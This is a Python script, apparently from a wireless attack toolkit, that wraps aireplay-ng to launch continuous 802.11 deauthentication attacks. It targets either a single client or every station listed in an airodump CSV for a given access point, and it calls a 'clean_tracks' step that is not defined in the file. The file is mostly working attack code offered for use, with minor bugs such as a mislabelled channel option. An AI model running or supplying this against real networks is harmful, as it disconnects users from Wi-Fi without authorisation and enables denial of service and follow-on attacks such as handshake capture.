import subprocess
import logging
import argparse

from wlan_monitor.monitor_utils import switch_interface
from airodump.station_collector import create_csv,\
    gather_station_list


parser = argparse.ArgumentParser(
    description='Deauthentication attack'
)
parser.add_argument(
    '-i',
    '--interface',
    required=True,
    type=str,
    help='interface name'
)
parser.add_argument(
    '-b',
    '--bssid',
    required=True,
    type=str,
    help='bssid'
)
parser.add_argument(
    '-s',
    '--station',
    type=str,
    help='station name'
)
parser.add_argument(
    '-c',
    '--channel',
    type=str,
    help='station name'
)
parser.add_argument(
    '-S',
    '--csvfile',
    type=str,
    help='airodump CSV file name'
)


def deauth_attack(interface, bssid, station, channel=None):
    """
    Attacks a single target from a given BSSID
    """
    deauth_cmd = [
        'aireplay-ng',
        '--deauth',
        '0',
        '-a',
        bssid,
        '-c',
        station,
        interface,
    ]
    """
        '&',
        'disown',
        ';',
        'exit',
    """
    if channel:
        switch_interface(interface, channel)
    subprocess.call(deauth_cmd)


def kill_all(interface, bssid, csv_file_name, channel=None):
    """
    Attacks all targets from the same BSSID
    """
    targets_list = gather_station_list(csv_file_name)
    for target in targets_list:
        deauth_attack(interface, bssid, target, channel)
    clean_tracks(csv_file_name)
    

if __name__ == "__main__":
    args = parser.parse_args()
    interface = args.interface + 'mon'
    bssid = args.bssid
    station = args.station
    channel = args.channel

    if args.csvfile:
        csv_file_name = args.csvfile
    else:
        csv_file_name = create_csv(interface, bssid, channel)

    if args.station:
        deauth_attack(interface, str(bssid), str(station))
    else:
        kill_all(interface, bssid, csv_file_name, channel)

